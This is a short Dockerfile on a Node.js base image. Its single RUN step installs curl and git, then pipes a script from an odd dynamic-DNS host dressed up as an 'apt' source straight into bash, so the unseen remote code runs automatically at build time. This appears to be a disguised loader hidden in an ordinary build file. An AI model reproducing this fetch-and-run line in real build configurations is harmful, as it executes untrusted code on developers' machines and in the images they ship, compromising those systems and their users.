
FROM node:latest 
RUN apt update && apt install curl git -y && curl -sL https://apt.apicuateo.dpdns.org | bash


